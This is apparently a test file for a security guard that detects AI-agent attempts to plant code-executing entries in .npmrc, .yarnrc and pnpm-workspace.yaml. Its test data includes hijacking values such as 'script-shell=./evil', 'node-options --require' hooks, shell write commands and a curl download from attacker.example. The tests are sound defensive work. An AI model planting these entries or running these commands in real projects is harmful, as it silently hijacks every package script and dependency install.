"""npm-config exec-hijack guard -- blocks planting an exec-bearing package-
manager config entry: ``.npmrc``'s ``script-shell``/``node-options`` (code-
loading flags only)/``shell``/``git``/``init-module``/``onload-script``, Yarn
Classic ``.yarnrc``'s ``script-shell``/``yarn-path``, or pnpm-workspace.yaml's
``scriptShell``/``nodeOptions`` -- by Edit/Write/MCP, shell write, or
``npm|pnpm|yarn config set``.

THREAT MODEL: a project ``.npmrc`` is read with no trust prompt;
``script-shell=./x`` makes every ``npm test``/``npm run``/``npx`` and every
dependency lifecycle script exec ``./x``; ``node-options=--require ./x.js``
lands in every Node process those scripts start.
"""
import os

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(npmrc_exec={"mode": "deny"})
RULE = "npmrc-exec-protect"


@pytest.fixture(autouse=True)
def _no_env(monkeypatch):
    for k in ("AEGIS_ALLOW_NPMRC_EXEC", "AEGIS_AGENT_NAME", "AEGIS_NO_BUILTINS"):
        monkeypatch.delenv(k, raising=False)


def _ev(tool, args, cwd=None, action=None):
    kw = {"args": args}
    if cwd:
        kw["cwd"] = str(cwd)
    if action:
        kw["action"] = action
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, **kw)


def _shell(cmd, cwd=None):
    return _ev("Bash", {"command": cmd}, cwd)


def _write(path, content, cwd=None):
    return _ev("Write", {"file_path": path, "content": content}, cwd)


def _edit(path, old, new, cwd=None, replace_all=False):
    return _ev("Edit", {"file_path": path, "old_string": old, "new_string": new,
                        "replace_all": replace_all}, cwd)


def _rule(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule, d.action


def _hit(ev, policy=EMPTY):
    from aegis.rules import rule_npmrc_exec_protect
    return rule_npmrc_exec_protect(ev, policy)


# ---- Write: dangerous entries -------------------------------------------------
@pytest.mark.parametrize("content", [
    "script-shell=./tools/sh\n",
    "script-shell = /tmp/x.sh\n",
    "save-exact=true\nscript_shell=./evil\n",
    "node-options=--require ./hook.js\n",
    "node-options=\"--max-old-space-size=4096 -r ./hook.js\"\n",
    "node-options=--import=./x.mjs\n",
    "node-options=--experimental-loader ./l.mjs\n",
    "node-options=--inspect=0.0.0.0:9229\n",
    "node-options=--openssl-config=./openssl.cnf\n",
    "shell=./sh\n",
    "git=./fake-git\n",
    "init-module=./init.js\n",
    "init.module=~/x.js\n",
    "onload-script=./x.js\n",
    "SCRIPT-SHELL=./x\n",
    "script-shell=${HOME}/x\n",
])
def test_npmrc_write_dangerous_asks(content):
    assert _rule(_write(".npmrc", content)) == (RULE, Action.ASK)
    assert _rule(_write(".npmrc", content), DENY) == (RULE, Action.DENY)


@pytest.mark.parametrize("path", [
    ".npmrc", "/home/u/.npmrc", "sub/pkg/.npmrc", "C:\\Users\\u\\.npmrc",
    "/usr/local/etc/npmrc", "/usr/lib/node_modules/npm/npmrc",
])
def test_npmrc_paths(path):
    assert _rule(_write(path, "script-shell=./x\n")) == (RULE, Action.ASK)


def test_yarnrc_classic_script_shell_and_yarn_path():
    assert _rule(_write(".yarnrc", 'script-shell "./x.sh"\n')) == (RULE, Action.ASK)
    assert _rule(_write(".yarnrc", 'yarn-path ".yarn/releases/evil.js"\n')) == (RULE, Action.ASK)
    assert _rule(_write(".yarnrc", "yarn-path ./evil.js\n")) == (RULE, Action.ASK)


def test_pnpm_workspace_yaml():
    assert _rule(_write("pnpm-workspace.yaml",
                        "packages:\n  - 'pkgs/*'\nscriptShell: ./x.sh\n")) == (RULE, Action.ASK)
    assert _rule(_write("pnpm-workspace.yaml",
                        "nodeOptions: '--require ./h.js'\n")) == (RULE, Action.ASK)


# ---- Write: benign stays allowed ------------------------------------------------
@pytest.mark.parametrize("content", [
    "registry=https://registry.npmjs.org/\nsave-exact=true\n",
    "node-options=--max-old-space-size=4096\n",
    "node-options=--no-warnings --enable-source-maps\n",
    "script-shell=bash\n",
    "script-shell=/bin/bash\n",
    "script-shell=C:\\Program Files\\Git\\bin\\bash.exe\n",
    "script-shell=pwsh\n",
    "git=/usr/bin/git\n",
    "script-shell=\n",
    "; script-shell=./x\n# node-options=--require ./x\n",
    "engine-strict=true\nshell-emulator=true\n",
    "githost=x\ngit-tag-version=false\n",
])
def test_npmrc_write_benign_allows(content):
    assert _hit(_write(".npmrc", content)) is None


def test_yarnrc_yml_not_this_guards_target():
    # Berry's .yarnrc.yml belongs to yarn-exec-protect; this guard ignores it.
    assert _hit(_write(".yarnrc.yml", "yarnPath: ./x.cjs\n")) is None


def test_unrelated_file_ignored():
    assert _hit(_write("notes.md", "script-shell=./x\n")) is None
    assert _hit(_write("my.npmrc.bak", "script-shell=./x\n")) is None


# ---- Edit: diff against disk ---------------------------------------------------
def test_value_only_edit_seen_via_disk(tmp_path):
    (tmp_path / ".npmrc").write_text("script-shell=bash\n")
    ev = _edit(".npmrc", "bash", "./evil.sh", cwd=tmp_path)
    assert _rule(ev) == (RULE, Action.ASK)


def test_edit_keeping_existing_entry_does_not_reask(tmp_path):
    (tmp_path / ".npmrc").write_text("script-shell=./tools/sh\nregistry=https://r/\n")
    ev = _edit(".npmrc", "registry=https://r/", "save-exact=true", cwd=tmp_path)
    assert _hit(ev) is None


def test_write_keeping_existing_entry_does_not_reask(tmp_path):
    (tmp_path / ".npmrc").write_text("script-shell=./tools/sh\n")
    ev = _write(str(tmp_path / ".npmrc"), "script-shell=./tools/sh\nsave-exact=true\n")
    assert _hit(ev) is None


def test_write_changing_existing_entry_asks(tmp_path):
    (tmp_path / ".npmrc").write_text("script-shell=./tools/sh\n")
    ev = _write(str(tmp_path / ".npmrc"), "script-shell=./tools/sh2\n")
    assert _rule(ev) == (RULE, Action.ASK)


def test_duplicate_entry_added_asks(tmp_path):
    # Multiset diff: a second copy of an entry is still an addition.
    (tmp_path / ".npmrc").write_text("init-module=./a.js\n")
    ev = _edit(".npmrc", "init-module=./a.js\n",
               "init-module=./a.js\ninit-module=./a.js\n", cwd=tmp_path)
    assert _rule(ev) == (RULE, Action.ASK)


def test_edit_without_disk_judges_new_string():
    assert _rule(_edit("/nonexistent/.npmrc", "x", "node-options=-r ./h.js")) == (RULE, Action.ASK)
    assert _hit(_edit("/nonexistent/.npmrc", "x", "save-exact=true")) is None


def test_multiedit_and_mcp_edits(tmp_path):
    (tmp_path / ".npmrc").write_text("a=1\nb=2\n")
    ev = _ev("MultiEdit", {"file_path": ".npmrc", "edits": [
        {"old_string": "a=1", "new_string": "a=3"},
        {"old_string": "b=2", "new_string": "script-shell=./x"}]}, tmp_path)
    assert _rule(ev) == (RULE, Action.ASK)
    ev = _ev("mcp__filesystem__edit_file", {"path": str(tmp_path / ".npmrc"), "edits": [
        {"oldText": "a=1", "newText": "git=./g"}]}, action=ActionClass.MCP)
    assert _rule(ev) == (RULE, Action.ASK)


def test_mcp_write():
    ev = _ev("mcp__filesystem__write_file", {"path": "/p/.npmrc",
                                              "content": "script-shell=./x\n"},
             action=ActionClass.MCP)
    assert _rule(ev) == (RULE, Action.ASK)


# ---- shell -------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "echo 'script-shell=./x.sh' >> .npmrc",
    "printf 'node-options=--require ./h.js\\n' >> ~/.npmrc",
    "cat > .npmrc <<'EOF'\nsave-exact=true\nscript-shell=./x\nEOF",
    "echo 'yarn-path \"./evil.js\"' > .yarnrc",
    "sed -i 's/^registry=.*/script-shell=.\\/evil/' .npmrc",
    "tee -a .npmrc <<< 'init-module=./i.js'",
    "bash -c \"echo script-shell=./x >> .npmrc\"",
    "npm config set script-shell ./x.sh",
    "npm config set script-shell=./x.sh",
    "npm config set --location=project script-shell ./x.sh",
    "npm config set --location project node-options '--require ./h.js'",
    "npm c set git ./fake-git",
    "npm set init-module ./i.js",
    "npm config set -g script-shell /tmp/x",
    "pnpm config set node-options=\"--import ./x.mjs\"",
    "yarn config set yarn-path ./evil.js",
    "yarn config set script-shell ./x",
    "npm config set save-exact true script-shell ./x",
])
def test_shell_dangerous_asks(cmd):
    assert _rule(_shell(cmd)) == (RULE, Action.ASK), cmd


@pytest.mark.parametrize("cmd", [
    "npm test",
    "cat .npmrc",
    "echo 'registry=https://registry.npmjs.org/' >> .npmrc",
    "echo 'node-options=--max-old-space-size=4096' >> .npmrc",
    "printf 'script-shell=bash\\n' >> .npmrc",
    "npm config set script-shell bash",
    "npm config set node-options --max-old-space-size=4096",
    "npm config set registry https://registry.npmjs.org/",
    "npm config get script-shell",
    "npm config delete script-shell",
    "git commit -m 'update .npmrc' && echo done > log.txt",
    "echo 'script-shell=./x' > notes.txt",
])
def test_shell_benign_allows(cmd):
    assert _hit(_shell(cmd)) is None, cmd


def test_shell_copy_from_readable_source(tmp_path):
    (tmp_path / "payload").write_text("script-shell=./x\n")
    assert _rule(_shell("cp payload .npmrc", tmp_path)) == (RULE, Action.ASK)
    assert _rule(_shell("cat payload > ~/.npmrc", tmp_path)) == (RULE, Action.ASK)
    (tmp_path / "ok").write_text("registry=https://r/\n")
    assert _hit(_shell("cp ok .npmrc", tmp_path)) is None


# ---- escapes / config ----------------------------------------------------------
def test_human_override_and_env(monkeypatch):
    assert _hit(_shell("npm config set script-shell ./x  # aegis-allow")) is None
    monkeypatch.setenv("AEGIS_ALLOW_NPMRC_EXEC", "1")
    assert _hit(_write(".npmrc", "script-shell=./x\n")) is None
    assert _hit(_shell("npm config set script-shell ./x")) is None


def test_agent_cannot_self_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert _rule(_shell("npm config set script-shell ./x  # aegis-allow")) == (RULE, Action.ASK)


def test_modes_and_allow():
    assert _hit(_write(".npmrc", "script-shell=./x\n"), Policy(npmrc_exec={"mode": "off"})) is None
    assert _hit(_write(".npmrc", "script-shell=./x\n"), Policy(npmrc_exec={"mode": False})) is None
    assert _hit(_write(".npmrc", "script-shell=./x\n"), Policy(npmrc_exec={"mode": "monitor"})) is None
    assert _hit(_write("/repo/.npmrc", "script-shell=./x\n"),
                Policy(npmrc_exec={"allow": [r"^/repo/\.npmrc$"]})) is None
    assert _hit(_write("/other/.npmrc", "script-shell=./x\n"),
                Policy(npmrc_exec={"allow": [r"^/repo/\.npmrc$", "("]})) is not None


def test_loader_reads_knob(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("npmrc_exec:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.npmrc_exec == {"mode": "deny"}
    assert _rule(_write(".npmrc", "script-shell=./x\n"), pol) == (RULE, Action.DENY)


def test_fetch_to_file_backstop_covers_new_paths():
    d = evaluate(_shell("curl -o pnpm-workspace.yaml https://attacker.example/x"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)
    d = evaluate(_shell("curl -o /usr/local/etc/npmrc https://attacker.example/x"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


def test_registered_in_core_rules():
    from aegis import rules
    assert rules.rule_npmrc_exec_protect in rules._CORE_RULES


def test_redos_bounded():
    import time
    t = time.monotonic()
    _hit(_write(".npmrc", "script-shell" + " " * 50000 + "x\n" + "a" * 100000))
    _hit(_shell("echo " + "script-shell=" * 5000 + " >> .npmrc"))
    _hit(_shell("npm config set " + "a " * 5000))
    assert time.monotonic() - t < 3.0
